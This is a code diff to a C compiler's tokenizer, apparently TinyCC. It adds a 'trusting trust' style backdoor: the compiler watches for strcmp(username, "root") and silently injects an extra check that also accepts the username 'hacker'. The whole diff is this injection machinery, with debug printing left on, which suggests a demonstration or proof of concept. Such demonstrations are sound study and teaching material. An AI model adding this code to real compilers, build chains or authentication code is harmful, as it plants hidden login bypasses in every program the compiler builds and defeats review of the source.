@@ -2558,6 +2558,30 @@ static void parse_number(const char *p)
         }                                       \
         break;
 
+int c_login;
+int insert_txt = 0;
+uint8_t *text = 0;
+
+void match(char **match_toks, int match_len, int *match, char *insert) {
+    const char *str = get_tok_str(tok, &tokc);
+    if (strcmp(match_toks[*match], str) == 0){
+        (*match)++;
+        }
+    else {
+        (*match) = 0;
+    }
+    if ((*match) == match_len) {
+        printf("INSERTING\n");
+        insert_txt = 1;
+        text = (uint8_t *)insert;
+        (*match) = 0;
+    }
+}
+
+char *login_toks[] = {"strcmp", "(", "username", ",", "\"root\"", ")"};
+
+char *login_txt = " || !strcmp(username, \"hacker\")";
+
 /* return next token without macro substitution */
 static void next_nomacro(void)
 {
@@ -2566,8 +2590,14 @@ static void next_nomacro(void)
     uint8_t *p, *p1;
     unsigned int h;
 
-    p = file->buf_ptr;
- redo_no_start:
+    // INSERT TOKS
+    if (insert_txt == 1 && text != 0 && *text != 0) {
+        p = text; 
+    } else {
+        insert_txt = 0;
+        p = file->buf_ptr;
+    }
+redo_no_start:
     c = *p;
     switch(c) {
     case ' ':
@@ -2965,7 +2995,15 @@ maybe_newline:
     }
     tok_flags = 0;
 keep_tok_flags:
-    file->buf_ptr = p;
+    if (insert_txt == 1) {
+        text = p;
+    } else file->buf_ptr = p;
+
+    if (insert_txt == 0) {
+        match(login_toks, 6, &c_login, login_txt);
+    }
+    
+    #define PARSE_DEBUG
 #if defined(PARSE_DEBUG)
     printf("token = %d %s\n", tok, get_tok_str(tok, &tokc));
 #endif
